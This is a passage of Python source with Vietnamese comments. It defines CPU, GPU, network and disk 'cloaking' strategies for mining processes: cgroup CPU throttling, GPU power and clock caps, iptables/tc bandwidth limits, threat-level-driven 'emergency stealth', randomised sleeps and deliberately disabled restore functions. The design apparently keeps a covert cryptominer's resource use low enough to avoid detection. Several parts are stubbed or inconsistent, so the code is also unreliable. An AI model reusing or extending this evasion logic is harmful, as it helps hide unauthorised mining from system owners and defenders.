                            self.logger.info(f"🧹 [Early Cleanup] Removed dead PID={pid}, skipping cloaking")
                        
                        return  # EXIT EARLY - no verification needed
                        
                    elif not process_obj.is_running():
                        self.logger.warning(f"💀 [Early Check] PID={pid} not running - Skipping throttling")
                        return
                        
                except psutil.NoSuchProcess:
                    self.logger.warning(f"💀 [Early Check] PID={pid} does not exist - Skipping throttling")
                    return
                except Exception as e:
                    self.logger.debug(f"[Early Check] Cannot verify PID={pid}: {e}")
                    # Continue with throttling attempt
                
                base_cgroup_name = f"mining_process_{pid}"
                
                # Sử dụng privileged_manager nếu có cho cgroup setup
                if self.privileged_manager:
                    # Setup cgroup limits qua privileged operations
                    cpu_limit = str(int(100000 * (self.throttle_percentage / 100)))  # microseconds
                    memory_limit = str(2048 * 1024 * 1024)  # 2GB in bytes
                    
                    cgroup_success = self.privileged_manager.setup_cgroup_limits(
                        pid=pid,
                        cpu_limit=cpu_limit,
                        memory_limit=memory_limit
                    )
                    
                    if cgroup_success:
                        self.logger.info(f"🔐 [CPU Cloaking] Setup cgroup via privileged_manager for PID={pid}")
                
                # Determine throttle percentage based on stealth mode
                if self.advanced_stealth_enabled:
                    # Use base throttle percentage with threat level adaptation
                    current_throttle = self.base_throttle_percentage
                    if hasattr(self.cpu_resource_manager, 'current_threat_level'):
                        threat_level = getattr(self.cpu_resource_manager, 'current_threat_level', 'LOW')
                        threat_adjustment = {
                            "LOW": random.uniform(-10, 10),
                            "MEDIUM": random.uniform(10, 30),
                            "HIGH": random.uniform(30, 45)
                        }
                        current_throttle = max(25, min(95, current_throttle + threat_adjustment.get(threat_level, 0)))
                    
                    # Use optimized CPU cores if available
                    target_cores = self._get_current_target_cores()
                    
                    self.logger.info(f"🛡️ [CPU Cloaking] Advanced mode: {current_throttle:.1f}% throttle, cores: {target_cores}")
                else:
                    # Legacy mode
                    current_throttle = self.throttle_percentage if hasattr(self, 'throttle_percentage') else 70
                    target_cores = self.target_cores if hasattr(self, 'target_cores') else [0]
                
                success = self.cpu_resource_manager.throttle_cpu_usage(
                    pid=pid,
                    throttle_percentage=current_throttle,
                    base_cgroup_name=base_cgroup_name,
                    cores=target_cores
                )

                if success:
                    self.process_cgroup[pid] = {"base": base_cgroup_name}
                    stealth_indicator = "🛡️" if self.advanced_stealth_enabled else "🔧"
                    self.logger.info(
                        f"{stealth_indicator} [CPU Cloaking] Throttled {current_throttle:.1f}% for {name}(PID={pid}), cgroup={base_cgroup_name}, cores={target_cores}."
                    )

                    # Verify settings ONLY for successfully throttled processes
                    try:
                        verification_result = self._verify_cgroup_settings_safe(base_cgroup_name, pid)
                        if not verification_result:
                            self.logger.debug(f"[CPU Cloaking] Process PID={pid} had verification issues but throttling succeeded")
                    except Exception as verify_e:
                        self.logger.debug(f"[CPU Cloaking] Verification error for PID={pid}: {verify_e}")
                else:
                    self.logger.error(f"[CPU Cloaking] Không thể throttle {name} (PID={pid}).")

            # ✅ UNIFIED: Success completion logging
            self.logger.info(f"✅ [CPU Strategy] Successfully applied CPU cloaking to {name} (PID={pid})")
            self.logger.info(f"📊 [CPU Strategy] Final state - optimization: {optimization_level}, stealth: {stealth_level}")
            return True  # ✅ SUCCESS: CPU cloaking completed successfully
            
        except Exception as e:
            self.logger.error(f"❌ [CPU Strategy] Failed applying CPU cloaking to PID={process.pid}: {e}")
            self.logger.error(f"🔍 [CPU Strategy] Error details: {traceback.format_exc()}")
            return False  # ✅ FAILURE: CPU cloaking failed

    def _verify_cgroup_settings_safe(self, base_cgroup_name: str, pid: int) -> bool:
        """
        Safe verification WITHOUT cleanup - chỉ verify, không cleanup
        """
        try:
            process = psutil.Process(pid)
            
            # 1. Basic Process Health Check (no cleanup)
            try:
                status = process.status()
                if status in ['zombie', 'stopped']:
                    self.logger.debug(f"💀 [Verify] PID={pid} status: {status} - Verification incomplete")
                    return False
                elif not process.is_running():
                    self.logger.debug(f"💀 [Verify] PID={pid} not running - Verification incomplete")
                    return False
                else:
                    self.logger.debug(f"✅ [Verify] PID={pid} status OK: {status}")
                    
            except Exception as e:
                self.logger.debug(f"[Verify] Cannot check status PID={pid}: {e}")
                return False
            
            # 2. CPU Usage Monitoring
            try:
                cpu_percent = process.cpu_percent(interval=0.1)
                
                if cpu_percent > 800:  # >8 cores
                    self.logger.warning(f"🚨 [Verify] PID={pid} extreme CPU usage: {cpu_percent:.1f}%")
                elif cpu_percent > 400:  # >4 cores
                    self.logger.info(f"⚠️ [Verify] PID={pid} high CPU usage: {cpu_percent:.1f}%")
                elif cpu_percent > 200:  # >2 cores  
                    self.logger.debug(f"📊 [Verify] PID={pid} normal mining CPU: {cpu_percent:.1f}%")
                else:
                    self.logger.debug(f"📈 [Verify] PID={pid} low CPU usage: {cpu_percent:.1f}%")
                    
            except Exception as e:
                self.logger.debug(f"[Verify] Cannot check CPU usage PID={pid}: {e}")
            
            # 3. Memory & Priority Check
            try:
                memory_percent = process.memory_percent()
                nice_value = process.nice()
                cpu_affinity = process.cpu_affinity()
                affinity_count = len(cpu_affinity) if cpu_affinity else 0
                
                self.logger.debug(f"✅ [Verify] PID={pid} - Memory: {memory_percent:.1f}%, Nice: {nice_value}, Cores: {affinity_count}")
                
            except Exception as e:
                self.logger.debug(f"[Verify] Resource check error PID={pid}: {e}")
            
            return True
            
        except psutil.NoSuchProcess:
            self.logger.debug(f"💀 [Verify] PID={pid} no longer exists")
            return False
        except Exception as e:
            self.logger.debug(f"❌ [Verify] Error for PID={pid}: {e}")
            return False

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục CPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[CPU RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

    def _system_health_monitor(self):
        """
        System-wide health monitoring và optimization loop
        """
        while True:
            try:
                self.logger.debug("🔍 [System Health] Starting health check cycle")
                
                # 1. Cleanup dead processes
                self._cleanup_dead_processes()
                
                # 2. Optimize resource distribution
                self._optimize_resource_distribution()
                
                # 3. Check system-wide stealth indicators
                if self.advanced_stealth_enabled:
                    self._check_stealth_indicators()
                
                # 4. Memory cleanup
                self._system_memory_cleanup()
                
                # Sleep based on stealth mode
                sleep_duration = 45 if self.advanced_stealth_enabled else 90
                self.logger.debug(f"🔍 [System Health] Next check in {sleep_duration}s")
                time.sleep(sleep_duration)
                
            except Exception as e:
                self.logger.error(f"🔍 [System Health] Monitor error: {e}")
                time.sleep(60)

    def _cleanup_dead_processes(self):
        """Dọn dẹp zombie và stopped processes từ tracking"""
        try:
            dead_pids = []
            
            with self.core_lock:
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        status = process.status()
                        
                        if status in ['zombie', 'stopped'] or not process.is_running():
                            dead_pids.append(pid)
                            
                    except psutil.NoSuchProcess:
                        dead_pids.append(pid)
                    except Exception as e:
                        self.logger.debug(f"🧹 [Cleanup] Error checking PID={pid}: {e}")
                
                # Remove dead processes
                for pid in dead_pids:
                    if pid in self.process_cgroup:
                        del self.process_cgroup[pid]
                        self.logger.info(f"🧹 [Cleanup] Removed dead process PID={pid}")
                        
            if dead_pids:
                self.logger.info(f"🧹 [Cleanup] Cleaned up {len(dead_pids)} dead processes")
            else:
                self.logger.debug("🧹 [Cleanup] No dead processes found")
                
        except Exception as e:
            self.logger.error(f"🧹 [Cleanup] Error in dead process cleanup: {e}")

    def _optimize_resource_distribution(self):
        """Tối ưu hóa phân phối tài nguyên trên tất cả managed processes"""
        try:
            if not self.process_cgroup:
                return
                
            active_processes = {}
            total_cpu_usage = 0
            
            # Collect current resource usage
            for pid in list(self.process_cgroup.keys()):
                try:
                    process = psutil.Process(pid)
                    if process.is_running():
                        cpu_percent = process.cpu_percent(interval=0.1)
                        memory_percent = process.memory_percent()
                        
                        active_processes[pid] = {
                            'process': process,
                            'cpu_percent': cpu_percent,
                            'memory_percent': memory_percent
                        }
                        total_cpu_usage += cpu_percent
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            self.logger.debug(f"📊 [Resource Opt] Total CPU usage: {total_cpu_usage:.1f}% across {len(active_processes)} processes")
            
            # Rebalance if total usage is too high
            if total_cpu_usage > 600:  # >6 cores
                self.logger.warning(f"⚖️ [Resource Opt] High total CPU usage: {total_cpu_usage:.1f}% - Rebalancing")
                
                # Sort by CPU usage and throttle highest users
                sorted_processes = sorted(active_processes.items(), key=lambda x: x[1]['cpu_percent'], reverse=True)
                
                for pid, info in sorted_processes[:3]:  # Top 3 CPU users
                    try:
                        process = info['process']
                        current_nice = process.nice()
                        
                        if current_nice < 15:  # Can be throttled more
                            process.nice(min(19, current_nice + 5))
                            self.logger.info(f"⚖️ [Resource Opt] Increased nice value for high CPU PID={pid}")
                            
                    except Exception as e:
                        self.logger.debug(f"⚖️ [Resource Opt] Error throttling PID={pid}: {e}")
                        
        except Exception as e:
            self.logger.error(f"⚖️ [Resource Opt] Optimization error: {e}")

    def _check_stealth_indicators(self):
        """Kiểm tra các chỉ báo stealth toàn hệ thống"""
        try:
            if not self.advanced_stealth_enabled:
                return
                
            # Check threat level from resource manager
            if hasattr(self.cpu_resource_manager, 'current_threat_level'):
                threat_level = getattr(self.cpu_resource_manager, 'current_threat_level', 'LOW')
                
                # Adaptive response based on threat level
                if threat_level == "HIGH":
                    self._emergency_stealth_protocol()
                elif threat_level == "MEDIUM":
                    self._enhanced_stealth_protocol()
                else:
                    self.logger.debug(f"🛡️ [Stealth Check] Threat level: {threat_level} - Normal operation")
                    
        except Exception as e:
            self.logger.error(f"🛡️ [Stealth Check] Error: {e}")

    def _emergency_stealth_protocol(self):
        """Các biện pháp stealth khẩn cấp cho HIGH threat"""
        try:
            self.logger.warning("🚨 [Emergency Stealth] HIGH threat detected - Activating emergency protocols")
            
            with self.core_lock:
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        if process.is_running():
                            # Maximum stealth settings
                            process.nice(19)  # Lowest priority
                            # Single core enforcement via cgroup cpuset (not process affinity)
                            
                            self.logger.info(f"🚨 [Emergency Stealth] Applied maximum stealth to PID={pid}")
                            
                    except Exception as e:
                        self.logger.debug(f"🚨 [Emergency Stealth] Error with PID={pid}: {e}")
                        
        except Exception as e:
            self.logger.error(f"🚨 [Emergency Stealth] Protocol error: {e}")

    def _enhanced_stealth_protocol(self):
        """Các biện pháp stealth nâng cao cho MEDIUM threat"""
        try:
            self.logger.info("⚠️ [Enhanced Stealth] MEDIUM threat detected - Enhancing stealth")
            
            with self.core_lock:
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        if process.is_running():
                            # Enhanced stealth settings
                            current_nice = process.nice()
                            if current_nice < 15:
                                process.nice(15)
                                
                            # Monitor and plan to limit to 2 cores max via cgroup cpuset
                            current_affinity = process.cpu_affinity()
                            if current_affinity and len(current_affinity) > 2:
                                limited_affinity = current_affinity[:2]
                                # Should apply via cgroup cpuset instead of process affinity
                                
                            self.logger.info(f"⚠️ [Enhanced Stealth] Applied enhanced stealth to PID={pid}")
                            
                    except Exception as e:
                        self.logger.debug(f"⚠️ [Enhanced Stealth] Error with PID={pid}: {e}")
                        
        except Exception as e:
            self.logger.error(f"⚠️ [Enhanced Stealth] Protocol error: {e}")

    def _system_memory_cleanup(self):
        """Dọn dẹp bộ nhớ hệ thống và tối ưu hóa"""
        try:
            # Force garbage collection
            import gc
            gc.collect()
            
            # Check system memory usage
            memory = psutil.virtual_memory()
            if memory.percent > 80:
                self.logger.warning(f"🧠 [Memory Cleanup] High system memory usage: {memory.percent:.1f}%")
                
                # Try to free up memory from managed processes
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        if process.is_running() and process.memory_percent() > 20:
                            # Could implement memory pressure techniques here
                            self.logger.info(f"🧠 [Memory Cleanup] High memory process PID={pid}: {process.memory_percent():.1f}%")
                    except:
                        continue
                        
            self.logger.debug(f"🧠 [Memory Cleanup] System memory usage: {memory.percent:.1f}%")
            
        except Exception as e:
            self.logger.error(f"🧠 [Memory Cleanup] Error: {e}")

###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy                              #
###############################################################################

class GpuCloakStrategy(CloakStrategy):
    """
    ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
      - Giới hạn power limit,
      - Set xung nhịp,
      - Integrated thermal monitoring và protection
      - Advanced thermal throttling với emergency protection
    
    UNIFIED strategy eliminates need for separate ThermalControlStrategy.
    """
    
    strategy_type = StrategyType.GPU
    
    # ✅ UNIFIED: Comprehensive cloaking attributes
    is_primary_strategy = True  # GPU cloaking is PRIMARY for GPU processes
    coordination_priority = 100  # Highest priority for GPU processes
    resource_conflicts = []  # ✅ NO CONFLICTS - integrated thermal management
    depends_on_strategies = []  # No dependencies
    supports_concurrent_application = True  # Safe to apply with other strategies
    estimated_application_time_ms = 400  # GPU + thermal control ~400ms
    requires_plugin_system = True  # GPU strategies require plugin system

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: GPUResourceManager
    ):
        """
        ✅ UNIFIED: Khởi tạo comprehensive GPU cloaking với integrated thermal management.

        :param config: Cấu hình cloaking GPU (dict).
        :param logger: Logger.
        :param gpu_resource_manager: ResourceManager liên quan đến GPU.
        """
        self.logger = logger
        self.config = config

        # ✅ FALLBACK: If GPUResourceManager not provided, create on-demand
        if gpu_resource_manager is None:
            self.logger.warning("⚠️ GPUResourceManager is None – creating fallback instance (on-demand)")
            try:
                # Tránh import vòng lặp
                from mining_environment.scripts.resource_control import GPUResourceManager as _GPUResourceManager
                from mining_environment.scripts.unified_logging import get_unified_logger

                fallback_logger = get_unified_logger('resource_control')
                gpu_resource_manager = _GPUResourceManager(config, fallback_logger)
                self.logger.info("✅ Fallback GPUResourceManager created successfully")
            except Exception as err:
                self.logger.error(f"❌ Failed to create fallback GPUResourceManager: {err}")
                gpu_resource_manager = None

        self.gpu_resource_manager = cast(Any, gpu_resource_manager)

        self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring

        # Tên tiến trình GPU trong config
        self.allowed_process_name = config.get("processes", {}).get("GPU", "")
        if not self.allowed_process_name:
            self.logger.warning("Không tìm thấy cấu hình tiến trình GPU (key='GPU') trong config.")

        # ✅ UNIFIED: GPU Performance Control
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
            self.throttle_percentage = 20

        self.target_sm_clock = config.get('sm_clock', 1240)
        
        # ✅ UNIFIED: Integrated Thermal Management Configuration
        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
        self.aggressive_cooling = config.get('aggressive_cooling', False)
        
        # ✅ UNIFIED: Thermal monitoring enables
        self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
        self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
        self.target_mem_clock = config.get('mem_clock', 877)

        self.temperature_threshold = config.get('temperature_threshold', 80)
        if self.temperature_threshold <= 0:
            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
            self.temperature_threshold = 80

    def _limit_temperature_and_random_sleep(self, pid: int, gpu_count: int) -> None:
        """
        Hàm nội bộ để:
          - Giới hạn nhiệt độ cho mỗi GPU (nếu cần)
          - Ngủ một khoảng thời gian ngẫu nhiên (chỉ gọi 1 lần).
        """
        # --- Giới hạn nhiệt độ ---
        for gpu_index in range(gpu_count):
            if self.stop_monitoring:
                self.logger.info("[GPU Cloaking] Dừng giám sát nhiệt độ do yêu cầu khôi phục tài nguyên.")
                break

            success_temp = self.gpu_resource_manager.limit_temperature(
                gpu_index=gpu_index,
                temperature_threshold=self.temperature_threshold,
                fan_speed_increase=0  # Không tăng tốc độ quạt
            )
            if success_temp:
                self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
            else:
                self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")

        # --- Ngủ ngẫu nhiên ---
        INTERVAL_CHOICES = [
            (300, 600),    # 5 - 10 phút
            (600, 1200),   # 10 - 20 phút
            (1200, 1800),  # 20 - 30 phút
            (1800, 3600),  # 30 - 60 phút
            (3600, 7200),  # 60 - 120 phút
        ]
        chosen_range = random.choice(INTERVAL_CHOICES)  # ví dụ (600, 1800)
        random_sleep_sec = random.randint(*chosen_range)

        self.logger.debug(
            f"[GPU Cloaking] Ngủ {random_sleep_sec} giây (được chọn từ {chosen_range}) sau khi limit nhiệt độ."
        )
        time.sleep(random_sleep_sec)
        
    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ UNIFIED: Áp dụng GPU cloaking với metadata-aware optimization và return validation.
        
        :param process: Enhanced MiningProcess với classification metadata.
        :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            # ✅ SAFETY CHECK: Ensure gpu_resource_manager ready
            if self.gpu_resource_manager is None:
                self.logger.error("💀 GPUResourceManager not available – aborting gpu_cloaking apply")
                return False

            pid, name = process.pid, process.name

            self.logger.info(f"🎮 [Unified GPU Cloaking] Processing {name} (PID={pid}) with integrated thermal control")

            # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
            if self.allowed_process_name and name != self.allowed_process_name:
                self.logger.debug(
                    f"[GPU Cloaking] Bỏ qua tiến trình '{name}' (PID={pid}) do không khớp tên GPU trong config."
                )
                return

            gpu_count = self.gpu_resource_manager.get_gpu_count()
            if gpu_count == 0:
                self.logger.warning("[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
                return

            # Giới hạn power + set clocks cho mỗi GPU
            for gpu_index in range(gpu_count):
                current_pl = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
                if current_pl is None:
                    self.logger.error(f"[GPU Cloaking] Không thể lấy power limit cho GPU={gpu_index}.")
                    continue

                # Bỏ qua nếu công suất hiện tại đã thấp hơn 100W
                if current_pl <= 100:
                    self.logger.warning(f"[GPU Cloaking] GPU={gpu_index} => power={current_pl}W (PID={pid}).")
                    continue
                
                desired_pl = int(round(current_pl * (1 - self.throttle_percentage / 100)))
                
                # Sử dụng privileged_manager nếu có cho GPU clock control
                if self.privileged_manager:
                    clock_success = self.privileged_manager.set_gpu_clock_limits(
                        gpu_id=gpu_index,
                        sm_clock=self.target_sm_clock,
                        mem_clock=self.target_mem_clock
                    )
                    if clock_success:
                        self.logger.info(f"🔐 [GPU Cloaking] Set clocks via privileged_manager for GPU={gpu_index}")
                
                ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
                if ok_pl:
                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")
                else:
                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn power limit cho GPU={gpu_index}.")

            # ✅ UNIFIED: Integrated thermal management (không cần separate thread)
            if self.enable_thermal_monitoring:
                self._apply_integrated_thermal_management(pid, gpu_count)
            
            self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
            return True  # ✅ SUCCESS: GPU cloaking completed successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"GPU Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='GpuCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='GPU',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: GPU cloaking failed
            
    def _apply_integrated_thermal_management(self, pid: int, gpu_count: int) -> None:
        """
        ✅ UNIFIED: Integrated thermal management trong GPU cloaking strategy.
        
        Eliminates need for separate ThermalControlStrategy.
        """
        try:
            self.logger.info(f"🌡️ [Integrated Thermal] Applying thermal management for PID={pid}")
            
            for gpu_index in range(gpu_count):
                try:
                    # Get current temperature
                    current_temp = self.gpu_resource_manager.get_gpu_temperature(gpu_index)
                    if current_temp is None:
                        continue
                        
                    self.logger.debug(f"🌡️ [Thermal] GPU {gpu_index}: {current_temp}°C (threshold: {self.gpu_temp_threshold}°C)")
                    
                    # Apply thermal responses
                    if current_temp >= self.emergency_shutdown_temp:
                        self._apply_emergency_thermal_protection(gpu_index, pid)
                    elif current_temp >= self.gpu_temp_threshold:
                        self._apply_progressive_thermal_throttling(gpu_index, current_temp, pid)
                    else:
                        self.logger.debug(f"✅ [Thermal] GPU {gpu_index} temperature normal")
                        
                except Exception as gpu_error:
                    self.logger.error(f"❌ [Thermal] Error processing GPU {gpu_index}: {gpu_error}")
                    
        except Exception as e:
            self.logger.error(f"❌ [Integrated Thermal] Thermal management error: {e}")

    def _apply_progressive_thermal_throttling(self, gpu_index: int, current_temp: float, pid: int) -> None:
        """Progressive thermal throttling based on temperature overshoot"""
        try:
            temp_overshoot = current_temp - self.gpu_temp_threshold
            throttle_intensity = min(50, int(temp_overshoot * 2))
            
            current_power = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
            if current_power:
                reduced_power = int(current_power * (100 - throttle_intensity) / 100)
                success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, reduced_power)
                
                if success:
                    self.logger.warning(f"🌡️ [Thermal Throttle] GPU {gpu_index}: {current_power}W → {reduced_power}W")
                else:
                    self.logger.error(f"❌ [Thermal] Failed throttling GPU {gpu_index}")
                    
        except Exception as e:
            self.logger.error(f"❌ [Thermal Throttle] Error: {e}")

    def _apply_emergency_thermal_protection(self, gpu_index: int, pid: int) -> None:
        """Emergency thermal protection measures"""
        try:
            self.logger.error(f"🚨 [EMERGENCY THERMAL] GPU {gpu_index} emergency protection")
            
            min_power_limit = 100  # Minimum safe power
            success = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, min_power_limit)
            
            if success:
                self.logger.error(f"🚨 [EMERGENCY] GPU {gpu_index} power → {min_power_limit}W")
            else:
                self.logger.error(f"💀 [EMERGENCY] Failed emergency protection GPU {gpu_index}")
                
        except Exception as e:
            self.logger.error(f"💀 [EMERGENCY] Error: {e}")

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục GPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[GPU RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            NETWORK STRATEGY: NetworkCloakStrategy                           #
###############################################################################

class NetworkCloakStrategy(CloakStrategy):
    """
    ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
      - Đánh dấu pid bằng iptables,
      - Giới hạn băng thông (tc).
    
    Enhanced cho comprehensive cloaking với network isolation.
    """
    
    strategy_type = StrategyType.NETWORK
    requires_plugin_system = False  # Network strategies execute directly
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy = False  # Network is SECONDARY strategy
    coordination_priority = 70  # Medium-high priority
    resource_conflicts = []  # No direct conflicts with other strategies
    depends_on_strategies = []  # Independent of other strategies
    supports_concurrent_application = True  # Safe to apply with any other strategy
    estimated_application_time_ms = 200  # iptables + tc commands ~200ms

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        network_resource_manager: NetworkResourceManager
    ):
        """
        Khởi tạo NetworkCloakStrategy.

        :param config: Cấu hình cloaking Network (dict).
        :param logger: Logger.
        :param network_resource_manager: ResourceManager liên quan đến Network.
        """
        self.logger = logger
        self.config = config
        self.network_resource_manager = cast(Any, network_resource_manager)

        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 700)
        if self.bandwidth_reduction_mbps <= 0:
            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=500.")
            self.bandwidth_reduction_mbps = 700

        self.network_interface = config.get('network_interface') or "eth0"
        self.process_marks: Dict[int, int] = {}

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng network cloaking với return value validation.
        
        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            mark = pid % 32768  # Dùng pid để tạo mark

            ok_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not ok_mark:
                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
                return False  # ✅ FAILURE: Cannot mark packets

            ok_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface, mark, self.bandwidth_reduction_mbps
            )
            if not ok_limit:
                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
                return False  # ✅ FAILURE: Cannot limit bandwidth

            self.process_marks[pid] = mark
            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")

            # Rollback mark_packets
            self.network_resource_manager.unmark_packets(pid, mark)
            return True  # ✅ SUCCESS: Network cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Net Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Network cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Network - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[NETWORK RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
###############################################################################
class DiskIoCloakStrategy(CloakStrategy):
    """
    Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.DISK_IO
    requires_plugin_system = False  # Disk I/O strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        disk_io_resource_manager: DiskIOResourceManager
    ):
        """
        Khởi tạo DiskIoCloakStrategy.

        :param config: Cấu hình cloaking Disk IO (dict).
        :param logger: Logger.
        :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
        """
        self.logger = logger
        self.config = config
        self.disk_io_resource_manager = cast(Any, disk_io_resource_manager)

        self.io_weight = config.get('io_weight', 3)
        if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
            self.io_weight = 3

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
